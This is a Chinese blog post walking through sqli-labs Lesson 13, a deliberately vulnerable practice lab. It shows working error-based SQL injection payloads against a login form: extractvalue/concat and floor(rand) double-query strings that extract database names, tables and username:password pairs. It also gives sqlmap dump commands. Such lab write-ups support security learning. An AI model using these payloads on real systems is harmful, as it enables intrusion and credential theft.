---
title: sqli-labs-lession 13 POST单引号双注入变形
date: 2018-09-27 14:01:58
tags:
categories: sql注入
---
# sqli-labs-lession 13 POST单引号双注入变形 #
---

## 登录界面 ##

![1](/img/sql/Lesson-13/1.png)

## 手注 ##

### 判断类型 ###

`'`检验是否报错

![2](/img/sql/Lesson-13/2.png)

返回报错信息

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''') and password=('') LIMIT 0,1' at line 1`

根据报错信息,很明显和Lesson-12课一样变量应该像`('$uname')`闭合起来。经过检验发现输入不存在的账号密码只会显示登录失败图片,登录成功也只显示成功图片。这里可以利用像Lesson-5一样利用报错显示信息。

### 获取字段数 ###

hackbar又不好用了。又要在表单里输入...

`xxx') order by 100#`

![3](/img/sql/Lesson-13/3.png)

`xxx') order by 2#`

无错误信息

![4](/img/sql/Lesson-13/4.png)

字段数为2。

### 获取数据库 ###

* extractvalue

函数解释：

extractvalue()：从目标XML中返回包含所查询值的字符串。
　　
EXTRACTVALUE (XML_document, XPath_string); 

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 

第二个参数：XPath_string (Xpath格式的字符串)

concat:返回结果为连接参数产生的字符串。

extract的第二个参数要求是xpath格式字符串,当输入xpath格式字符串就会报错,并把错误原因显示。但是限制长度是32位。

`xxx') and extractvalue(null,concat(0x7e,(select database()),0x7e))#`

![5](/img/sql/Lesson-13/5.png)

### 获取表 ###

`xxx') and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))#`

![6](/img/sql/Lesson-13/6.png)

### 获取列 ###

`xxx') and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e))#`

![7](/img/sql/Lesson-13/7.png)

### 获取值 ###

`xxx') and extractvalue(null,concat(0x7e,(select group_concat(username,':',password) from security.users),0x7e))#`

![8](/img/sql/Lesson-13/8.png)

这个时候这个函数的弊端就显示出来了,只显示了32个字符长度的信息。

修改payload。

`xxx') union select count(*),concat((floor(rand(0)*2)),'--',(select concat(username,':',password) from security.users limit 0,1))a from information_schema.tables group by a#`

![9](/img/sql/Lesson-13/9.png)

逐行查看。

## SQLMAP ##

firefox设置代理,再用Burpsuite抓包。

--technique E 

使用报错型注入

`sqlmap -r sqlpost/post13.txt -p uname --dbs --threads 10 --technique E`

![10](/img/sql/Lesson-13/10.png)

`sqlmap -r sqlpost/post13.txt -p uname -D security -T users --columns --dump`

![11](/img/sql/Lesson-13/11.png)








